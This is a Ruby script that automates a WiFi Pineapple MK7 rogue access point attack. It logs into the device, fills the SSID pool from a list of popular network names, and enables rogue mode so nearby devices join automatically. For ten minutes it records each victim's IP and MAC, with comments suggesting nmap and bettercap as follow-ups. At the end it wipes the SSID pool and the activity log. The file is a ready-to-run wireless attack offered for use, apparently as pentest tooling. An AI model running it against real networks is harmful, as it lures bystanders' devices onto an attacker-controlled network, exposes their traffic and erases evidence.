require_relative('../classes/PineappleMK7.rb')
include(PineappleMK7)

system = System.new()
system.host = "172.16.42.1"
system.port = "1471"
system.mac = "00:13:37:DD:EE:FF"
system.password = "P@55w0rD"

puts("[>] Authentication")
logged = system.login()

if (logged)

    pineAP = Modules::PineAP

    puts("[>] PineAP deactivation")
    pineAP.disable()

    puts("[>] Filtering by client(s) rejection")
    pineAP.filterClient("deny")

    puts("[>] Filtering by SSID(s) rejection")
    pineAP.filterSSID("deny")

    File.readlines('../payloads/top-wigle-ssids.txt', chomp: true).each() do |ssid|
        puts("[+] Adding '#{ssid}' SSID to the pool")
        pineAP.addSSID(ssid)
    end

    puts("[>] PineAP activation with rogue settings")
    pineAP.setRogue()

    puts("[>] Awaiting connections")

    30.times() do
        
        sleep(20)

        clients = (pineAP.getClients().nil?() === false) ? pineAP.getClients() : []
        clients.each() do |client|
            puts("[+] Client connected on '#{client.ssid()}' : #{client.ip()} - #{client.mac()}")
            # nmap
            # bettercap
        end

    end

    puts("[>] PineAP deactivation")
    pineAP.disable()

    puts("[>] Filtering by client(s) authorization")
    pineAP.filterClient("allow")

    puts("[>] Filtering by SSID(s) authorization")
    pineAP.filterSSID("allow")

    puts("[>] SSID(s) Pool cleaning")
    pineAP.clearPool()

    puts("[>] Activity Log cleaning")
    pineAP.clearActivity()

end